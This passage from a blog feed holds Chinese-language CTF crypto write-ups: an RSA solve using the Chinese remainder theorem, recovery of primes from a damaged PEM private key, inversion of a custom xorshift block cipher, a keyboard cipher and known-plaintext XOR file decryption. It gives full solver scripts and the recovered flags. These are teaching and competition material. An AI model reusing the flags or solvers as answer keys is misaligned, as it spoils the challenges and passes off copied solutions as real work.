class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault">p</span></span></span></span></span></p><p>c2同理</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mo>∗</mo><mi>r</mi><mspace linebreak="newline"></mspace><mo>=</mo><mo>&gt;</mo><mtext>  </mtext><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mo>=</mo><mtext> </mtext><msup><mi>m</mi><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>r</mi></mrow><annotation encoding="application/x-tex">c_2~=~m^e~mod~q*r\\=&gt;~~c_2~=~m^e~mod~r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.8643919999999999em;vertical-align:-0.15em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace nobreak"> </span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span></span></p><p>利用中国剩余定理crt，对c1=&gt;p c2=&gt;r</p><p>得到的结果是在p*r域内的$$m^e$$ 也就是对应的密文c</p><p>p r已知 在该域下进行基础的RSA解密</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">c1= ...</span><br><span class="line">c2= ...</span><br><span class="line">p= ...</span><br><span class="line">r= ...</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">final_c= crt(c1,c2,p,r)</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(final_c,d,p*r))))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;yUanshEnx1ncHun2o23!&#125;FA3JmflIoai8BxgdIGUQumsNc5R0hpo53zICaiWZRfjBj59P36EwC4CSfJOsZ3LIOYnhUmsQ&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="break">break</h3><h4 id="考点：私钥文件-破损修复">考点：私钥文件 破损修复</h4><h4 id="题目：">题目：</h4><p>破损私钥文件：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bc8tSTrvGJm2oYuCzIz+Yg4nwwKBgQDiYUawe5Y+rPbFhVOMVB8ZByfMa4LjeSDdZ23jEGvylBHSeyvFCQq3ISUE40k1D2XmmeaZML3a1nUn6ORIWGaG2phcwrWLkR6nubVmb1QJSzgzmFHGnL56KHByZxD9q6DPB+o6gGWt8/6ddBl2NIZU/1btdPQgojfAXXJFzR92RQKBgQC7qlB0U7m2U4FdG9eelSd+WSKNUVllZAuHji7jgh7Ox6La9xN5miGZ1yvP44yX218OJ9Zi08o6vIrM6Eil45KzTtGm4iuIn8CMpox+5eUtoxyvxa9rs2Wu+IRZN9zCME+p+qI8/TG27dIyDzsdgNqcUo8ESls7uW5/FEA7bYTCiQKBgQC71KybeB+kZ0zlfIdi8tVOpeI+uaHDbdh3+/5wHUsD3hmfg7VAag0q/2RA1vkB/oG1QVLVHl0Yu0I/1/u5jyeakrtClAegAsvlrK+3i321rGS4YpTPb3SX1P/f3GZ7o7DstouA+NHk8IL9T7xkmJYw5h/RLG32ucH6aU6MXfLR5QKBgD/skfdFxGWxhHk6U1mS27IM9jJNg9xLz5nxzkqPPhLn+rdgIIuTuQtv++eEjEP++7ZV10rg5yKVJd/bxy8H2IN7aQo7kZWulHTQDZMFwgOhn0u6glJi+qC8bWzYDFOQSFrY9XQ3vwKMspqm+697xM+dMUW0LML6oUE9ZjEiAY/5</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>密文c：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span><br></pre></td></tr></table></figure><h4 id="解题：">解题：</h4><p>首先对私钥文件恢复</p><p>第一步base64解密 得到的是乱码 转为16进制</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">05cf2d493aef1899b6a18b82cc8cfe620e27c3</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81 推测p</span><br><span class="line">02818100e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81 推测q</span><br><span class="line">02818100bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span><br><span class="line"></span><br><span class="line">#02整型 长度0x81  推测dp</span><br><span class="line">02818100bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span><br><span class="line"></span><br><span class="line">#02整型  长度128字节  推测dq</span><br><span class="line">0281803fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span><br></pre></td></tr></table></figure><p>上面的结果按照02进行切分 注意不是切所有02！</p><hr><p>关于RSA私钥格式前置知识：参考<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/#RSA%E7%A7%81%E9%92%A5">laz佬博客-rsa</a></p><p>其中整数数据格式举例<code>028180</code></p><p><code>02</code> : 整数的tag</p><p><code>81</code> : 长度类型 后面跟长度 比如128byte</p><p><code>80</code> : 整数占128byte</p><p>后面跟的则是value</p><p>关于私钥格式的顺序：</p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240115003333912.png" alt="image-20240115003333912" style="zoom:50%;" /><p>因为我们的破损文件只有后半部分，按照类型形成下面的预测</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240115004918221.png" alt="image-20240115004918221"></p><p>注意取值的时候 去掉tag信息 只保留<code>028181</code>这类信息后面的值</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0x00e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span></span><br><span class="line">q = <span class="number">0x00bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span></span><br><span class="line">dp = <span class="number">0x00bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span></span><br><span class="line">dq = <span class="number">0x3fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line"><span class="comment">#m = pow(c, dq, q) 失败 可能信息不全</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;oi!_you_find___what_i_Wa1t_talK_y0n!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-contest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023TUCTF&amp;NBCTF-Crypto&amp;Web</title>
      <link href="/2023/12/06/2023-12-3-TUCTF-NBCTF/"/>
      <url>/2023/12/06/2023-12-3-TUCTF-NBCTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2023-tuctf-nbctf">2023 TUCTF &amp; NBCTF</h1><h1 id="tuctf-crypto">TUCTF-Crypto</h1><p>网址：<a href="https://ctfd.tuctf.com/">https://ctfd.tuctf.com/</a></p><h2 id="custom-ecb-cipher-solved">Custom ECB Cipher | SOLVED</h2><h3 id="题面：">题面：</h3><p>I have designed a simple algorithm which I  believe it’s secure. I am confident you cannot compromise my message  with the x value.</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">msg</span>):</span><br><span class="line">    msg = msg ^ msg &gt;&gt; x</span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">13</span> &amp; <span class="number">275128763</span></span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">20</span> &amp; <span class="number">2186268085</span></span><br><span class="line">    msg = msg ^ msg &gt;&gt; <span class="number">14</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>)):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">c = transform(flag[<span class="number">6</span>:-<span class="number">1</span>]).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = e34a707c5c1970cc6375181577612a4ed07a2c3e3f441d6af808a8acd4310b89bd7e2bb9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="考点：ecb-异或移位算法的逆向">考点：ECB 异或移位算法的逆向</h3><h3 id="解题：">解题：</h3><p>该题的加密逻辑比较清晰，主要通过transform函数进行块加密，每4个字节的数据进行一次加密，进入到convert函数，我们观察convert函数，可以发现，这里的异或和移位操作全部都是可逆的，所以写出一个逆向解密函数</p><p>其中bits代表比特位数，4个字节为一组，一个字节占8bit，所以bits设置为32</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = b&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_right_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left</span>(<span class="params">res, shift, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;test:&quot;</span>,i)</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_left_mask</span>(<span class="params">res, shift, mask, bits=<span class="number">32</span></span>):</span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">        <span class="comment"># print(&quot;test:&quot;,i)</span></span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">msg,x</span>):</span><br><span class="line">    msg = msg ^ msg &gt;&gt; x</span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">13</span> &amp; <span class="number">275128763</span></span><br><span class="line">    msg = msg ^ msg &lt;&lt; <span class="number">20</span> &amp; <span class="number">2186268085</span></span><br><span class="line">    msg = msg ^ msg &gt;&gt; <span class="number">14</span></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_convert</span>(<span class="params">msg,x</span>):</span><br><span class="line">    msg = inverse_right(msg,<span class="number">14</span>)</span><br><span class="line">    msg = inverse_left_mask(msg,<span class="number">20</span>,<span class="number">2186268085</span>)</span><br><span class="line">    msg = inverse_left_mask(msg,<span class="number">13</span>,<span class="number">275128763</span>)</span><br><span class="line">    msg = inverse_right(msg,x)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_transform</span>(<span class="params">message,x</span>):</span><br><span class="line">    old_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(message) / <span class="number">4</span>)):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]  <span class="comment">#先取出4个字节</span></span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        <span class="comment"># print(block.bit_length())</span></span><br><span class="line">        block = inv_convert(block,x)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        old_message += block</span><br><span class="line">    <span class="keyword">return</span> old_message</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;e34a707c5c1970cc6375181577612a4ed07a2c3e3f441d6af808a8acd4310b89bd7e2bb9&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(inv_transform(a,x))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205150011387.png" alt="image-20231205150011387"></p><p>flag：<code>TUCTF&#123;sRta^s90s-#VgsnzPsta-TjLx7s8Txgs-*Ko&#125;</code></p><h2 id="keyboard-cipher-sovled">Keyboard Cipher | SOVLED</h2><h3 id="题面：">题面：</h3><p>I designed an algorithm to encrypt a  message using my keyboard. No one can decrypt it without any information about my algorithm. Note: Wrap the flag in TUCTF{}.</p><h3 id="题目：">题目：</h3><p>虽然提供了一个enc后缀的文件 但是直接改成txt后缀即可成功打开</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x636a56355279424b615464354946686b566942794e586c4849455279523359674d47394d49486845643045675a316b315569426163304d675a316c715469426163314567616b6c7354534268563252594947745063434178643045675332395149466c6e536d343d</span><br></pre></td></tr></table></figure><h3 id="考点：基础编码转换-键盘密码">考点：基础编码转换 键盘密码</h3><h3 id="解题：">解题：</h3><p>两步转换</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205155406745.png" alt="image-20231205155406745"></p><p>得到：</p><p><code>r5yG Ji7y XdV r5yG DrGv 0oL xDwA gY5R ZsC gYjN ZsQ jIlM aWdX kOp 1wA KoP YgJn</code></p><p>类似围棋 四个键围在中间的就是flag的值</p><h2 id="table-encryption-solved">Table Encryption | SOLVED</h2><h3 id="题面：">题面：</h3><p>You can’t crack my file! I am the exclusive owner of the encryption key!</p><h3 id="题目：">题目：</h3><p>题目给出了一个文件，其文件名为：<code>table_encryption.xml.enc</code></p><h3 id="考点：-文件解密">考点： 文件解密</h3><h3 id="解题：">解题：</h3><p>其后缀为enc 表明文件进行了加密</p><p>首先分析一下这个enc的加密模式，他是采用了某种加密方式对于文件里面的内容使用一个密钥进行加密，所以我们推测是采用了异或的加密模式，现在可以直接使用python中对于文件进行二进制流进行读取，相当于读取的内容是密文，然后因为文件后缀是xml文件 所以该文件开头部分我们是已知的，相当于明文已知，所以可以对密钥进行恢复</p><p>用010打开文件 获得前段部分的密文</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231205204044679.png" alt="image-20231205204044679"></p><p>数量可以先多一点 然后得到密钥的值后进行微调</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 